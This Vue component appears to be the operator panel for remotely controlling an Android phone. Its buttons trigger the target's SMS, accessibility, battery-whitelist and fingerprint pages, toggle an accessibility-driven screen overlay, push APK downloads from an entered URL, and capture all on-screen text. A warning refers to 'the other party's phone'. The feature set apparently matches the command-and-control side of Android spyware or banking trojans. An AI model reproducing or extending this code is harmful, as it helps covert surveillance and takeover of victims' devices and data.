<template>
  <div>
    <el-card class="common-list">
      <el-row class="">
        <el-col :span="24">
          <el-button
            icon="Picture"
            size="mini"
            @click="setInstructions(56, '')"
            >{{ $t("短信通知页") }}</el-button
          >
          <el-button icon="CreditCard" size="mini">{{
            $t("悬浮框页")
          }}</el-button>
          <el-button
            icon="Position"
            size="mini"
            @click="setInstructions(57, '')"
          >
            {{ $t("无障碍页") }}</el-button
          >
          <el-button
            icon="Position"
            size="mini"
            @click="setInstructions(58, '')"
            >{{ $t("电池加白") }}</el-button
          >
          <el-button icon="Setting" size="mini">{{ $t("自启动页") }}</el-button>
          <el-button icon="Setting" size="mini">{{ $t("指纹页") }}</el-button>
          <el-popconfirm
            :title="$t('关闭无障碍将导致遮盖消失，需要重新打开！是否确定关闭?')"
            @confirm="setInstructions(59, '')"
          >
            <template #reference>
              <el-button icon="Setting" size="mini">{{
                $t("关主包无障碍")
              }}</el-button>
            </template>
          </el-popconfirm>

          <el-popover :visible="state.APKvisible" placement="top" width="500px">
            <div
              style="width: 100%"
              class="u-flex u-flex-items-center u-flex-around"
            >
              <el-dropdown
                split-button
                size="small"
                type="primary"
                @hide="state.APKvisible = false"
                :hide-on-click="false"
                @command="getDropdownVal('downUrl', $event)"
              >
                {{ state.downUrl }}
                <template #dropdown>
                  <el-dropdown-menu>
                    <el-dropdown-item :command="$t('下载地址')">{{
                      $t("下载地址")
                    }}</el-dropdown-item>
                  </el-dropdown-menu>
                </template>
              </el-dropdown>
              <el-input
                v-model="state.inputUrl"
                style="width: 50%"
                :placeholder="$t('请输入')"
              />
              <el-dropdown
                split-button
                divided
                size="small"
                type="primary"
                @command="getDropdownVal('browser', $event)"
              >
                {{ state.selBrowser }}
                <template #dropdown>
                  <el-dropdown-menu>
                    <el-dropdown-item :command="$t('默认浏览器')">{{
                      $t("默认浏览器")
                    }}</el-dropdown-item>
                    <el-dropdown-item :command="$t('谷歌浏览器')">{{
                      $t("谷歌浏览器")
                    }}</el-dropdown-item>
                    <el-dropdown-item :command="$t('其他浏览器')">{{
                      $t("其它浏览器")
                    }}</el-dropdown-item>
                  </el-dropdown-menu>
                </template>
              </el-dropdown>
            </div>
            <div style="width: 100%">
              <el-button
                style="width: 100%"
                class="m-5"
                size="small"
                type="primary"
                @click="
                  state.APKvisible = false;
                  setInstructions(60, state.inputUrl);
                "
              >
                <el-icon><Download /></el-icon> {{ $t("下载") }}
              </el-button>
            </div>
            <template #reference>
              <el-button
                @click="
                  state.APKvisible = !state.APKvisible;
                  state.inputUrl = '';
                "
                icon="Setting"
                size="mini"
                >{{ $t("APK下载") }}</el-button
              >
            </template>
          </el-popover>
        </el-col>
      </el-row>
    </el-card>
    <el-card class="common-list">
      <el-row class="">
        <el-col :span="24">
          <el-button
            icon="Picture"
            size="mini"
            @click="(state.isGrasp = true), setInstructions(65, '')"
            >{{ $t("抓取全局文本") }}</el-button
          >
          <el-button icon="Avatar" size="mini">{{
            $t("抓取过滤文本")
          }}</el-button>
          <el-button
            icon="Close"
            size="mini"
            type="danger"
            v-if="state.isGrasp"
            @click="(state.isGrasp = false), setInstructions(66, '')"
            >{{ $t("结束抓取") }}</el-button
          >
        </el-col>
        <el-col :span="24" v-if="state.isGrasp">
          <view class="u-flex u-flex-items-center u-flex-wrap"
            ><view
              class="u-flex u-flex-items-center font-size-12 m-2 radius-5 globalText"
              v-for="item in phoneStore().getGlobalText"
            >
              <el-icon><Aim color="#67C23A" /></el-icon>
              <view class="p-0-2">{{ $t("点击") }}</view>
              <el-icon><Right /></el-icon>
              <view>{{ item.replace(/[\[\]。]/g, "") }}</view>
            </view></view
          >
        </el-col>
      </el-row>
    </el-card>
  </div>
</template>

<script setup>
// const content = "[通知栏。]";
// const extractedText = content; // 使用正则表达式去除方括号和句号
// console.log(extractedText); // 输出: 通知栏
// import { Upload } from "@element-plus/icons-vue";

import phoneStore from "@/store/modules/controlPhone";
import { reactive } from "vue";
import { nanoid } from "nanoid";
import Cookies from "js-cookie";
import { getUserId } from "@/utils/auth";
import { useI18n } from "vue-i18n";

import { ElMessage } from "element-plus";
const { t } = useI18n();
const route = useRoute();

let routeQuery = JSON.parse(route.query.command);
console.log("routeQuery", routeQuery);

const baseParams = {
  terminal: 1,
  userId: routeQuery.deviceId,
  adminId: `${getUserId()}_${Cookies.get("UUID")}`,
  reqId: nanoid(),
};
const state = reactive({
  isGrasp: false,
  APKvisible: false,
  selBrowser: t("默认浏览器"),
  downUrl: t("下载地址"),
});

const getDropdownVal = (index, e) => {
  switch (index) {
    case "downUrl":
      state.downUrl = e;
      break;
    case "browser":
      state.selBrowser = e;
      break;

    default:
      break;
  }
  console.log(e);
};
const setInstructions = (packType, text) => {
  ElMessage({
    message: t(
      "要使用该功能，请先确认对方的手机已开通【允许后台弹出窗口】的权限"
    ),
    type: "warning",
  });

  phoneStore().setDynamicParams({
    // terminal: 1, //终端类型1为管理终端  必传
    // packType, //必传
    // userId: route.query.deviceId, //发给哪个终端
    // // userId_uid: getUserId(),
    // adminId: `${getUserId()}_${Cookies.get("UUID")}`,
    // reqId: nanoid(), //必传
    ...baseParams,
    packType,
    strPack: text,
    // int32Pack: 3, //1.全局事件，需传参
  });
};
</script>

<style scoped>
.common-list {
  margin-bottom: 10px;
}

.common-list .el-button {
  margin: 10px;
  font-size: 12px;
}
.globalText {
  border: 1px solid#E6E8EB;
  padding: 5px;
}
</style>
